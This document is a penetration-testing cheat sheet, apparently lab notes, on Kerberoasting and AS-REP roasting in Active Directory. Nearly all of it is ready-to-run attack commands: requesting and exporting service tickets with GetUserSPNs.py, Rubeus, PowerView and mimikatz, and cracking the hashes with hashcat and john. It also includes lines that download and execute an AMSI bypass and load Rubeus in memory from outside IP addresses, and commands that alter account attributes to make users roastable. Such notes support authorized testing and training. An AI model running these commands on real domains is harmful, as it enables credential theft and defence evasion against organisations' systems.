### Kerberoasting:
    - cracking service account hash
    - Checking for users w/ SPNs:
        - **Check BloodHound** 
        - GetUserSPNs.py megacorp.local/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 -request -outputfile tgsrep.in
        - Native:   setspn -T <domain> -Q */*
    - Making a user Kerberoastable (if you have privs):
         - Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
    - Getting hashes:
        - (new-object system.net.webclient).downloadstring('http://192.168.45.158/amsi.txt') | IEX
        - PowerView:
            - iex (new-object Net.WebClient).DownloadString("http://192.168.45.158/Invoke-Kerberoast.ps1")
            - Invoke-Kerberoast -OutputFormat Hashcat | fl
            - Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
        - Rubeus:
            - in-memory:  $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.210/Rubeus.exe'); $assem = [System.Reflection.Assembly]::Load($data); [Rubeus.Program]::Main("<args>".Split())
            - .\Rubeus.exe kerberoast /format:hashcat /nowrap [/usetgtdeleg] [/user:svc_mssql] [/domain:corp2.com]
            - .\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast      //Specific user
            - .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap      //Get of admins
            - Other options:  /aes; /tgtdeleg; /creduser:ignite.local\Administrator /credpassword:P@ss123
        - Native:
            - Add-Type -AssemblyName System.IdentityModel
            - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
            - mimikatz # kerberos::list /export
            - kirbi2john.py sqldev.kirbi
            - Transform john to hashcat:  sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
    - Cracking:
        - hashcat -m 13100 --force -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt
        - john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast

### AS-REP Roasting:
    - Check for users:
        - PowerView:
            - Get-DomainUser -PreauthNotRequired -verbose
        - Check and Exploit from Kali:
            - GetNPUsers.py corp2.com/Administrator:lab -request -format hashcat -outputfile hashes.asreproast
            - sudo echo "192.168.235.80 corp2.com" >> /etc/hosts
    - Exploit:
        - rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local [/format:hashcat] [/outfile:out.txt]
        - Or:  Get-ASREPHash -UserName TargetUser
    - Enable (no preauth) for users you have privs/GenericAll over:
        - Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
    - Crack:
        - john --wordlist=passwords_kerb.txt hashes.asreproast
        - hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt